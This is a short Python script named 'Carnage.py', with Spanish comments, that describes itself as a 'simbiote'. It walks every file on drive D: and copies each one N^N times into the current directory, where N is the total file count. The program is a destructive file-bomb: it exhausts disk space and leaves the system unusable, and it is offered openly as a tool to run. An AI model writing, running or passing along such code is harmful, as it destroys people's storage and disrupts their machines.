# Carnage.py
# Simbiote que replica N elevado a la N, todos los archivos de un disco duro

import os
import shutil

def replicate_disk(disk_path):
    """Replica todos los archivos de un disco duro.

    Esta función recorre recursivamente todos los archivos en el disco duro
    especificado y replica cada archivo una cantidad de veces igual al número
    total de archivos en el disco.

    Args:
        disk_path (str): Ruta del disco duro que se replicará.
    """
    # Calcular el número total de archivos en el disco duro
    total_files = 0
    for root, dirs, files in os.walk(disk_path):
        total_files += len(files)
    
    # Recorrer nuevamente el disco duro y replicar cada archivo
    for root, dirs, files in os.walk(disk_path):
        for file in files:
            file_path = os.path.join(root, file)
            if os.path.isfile(file_path):
                # Calcular el número de réplicas para este archivo
                replicas = total_files ** total_files
                for i in range(replicas):
                    # Generar un nuevo nombre de archivo para cada réplica
                    new_file_name = f"{os.path.splitext(file)[0]}_{i}{os.path.splitext(file)[1]}"
                    new_file_path = os.path.join(".", new_file_name)
                    # Copiar el archivo original para crear la réplica
                    shutil.copy(file_path, new_file_path)
    
    # Imprimir un mensaje de éxito después de replicar todos los archivos
    print(f"Simbiote ha replicado todos los archivos del disco duro con éxito. Se han creado un total de {total_files ** total_files} réplicas por cada archivo.")

if __name__ == "__main__":
    # Especifica la ruta del disco duro que quieres replicar
    disk_path = r"D:\\"
    replicate_disk(disk_path)
